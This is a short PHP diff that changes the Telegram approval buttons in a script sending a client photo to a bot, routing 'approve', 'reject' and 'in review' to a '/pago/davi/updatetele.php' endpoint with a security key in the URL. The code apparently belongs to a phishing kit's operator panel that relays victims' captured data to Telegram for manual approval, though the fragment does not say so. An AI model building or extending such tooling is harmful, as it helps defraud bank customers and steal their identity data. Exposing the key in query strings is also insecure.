@@ -24,17 +24,21 @@ try {
     // Enviar Foto a Telegram
     $botToken = $config['botToken'];
     $chatId = $config['chatId'];
+    $baseUrl = $config['baseUrl'];
+    $security_key = $config['security_key'];
+
+    $daviUpdateUrl = rtrim(dirname($baseUrl), '/\\') . '/pago/davi/updatetele.php';
 
     $url = "https://api.telegram.org/bot{$botToken}/sendPhoto";
 
     $keyboard = [
         'inline_keyboard' => [
             [
-                ['text' => '✅ Aprobar Todo', 'callback_data' => "aprobar:{$cliente_id}"],
-                ['text' => '❌ Rechazar',     'callback_data' => "rechazar:{$cliente_id}"]
+                ['text' => '✅ Aprobar Todo', 'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=aprobado&key={$security_key}"],
+                ['text' => '❌ Rechazar',     'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=rechazado&key={$security_key}"]
             ],
             [
-                ['text' => '⏳ Seguir en revisión', 'callback_data' => "revision:{$cliente_id}"]
+                ['text' => '⏳ Seguir en revisión', 'url' => "{$daviUpdateUrl}?id={$cliente_id}&estado=en_revision&key={$security_key}"]
             ]
         ]
     ];
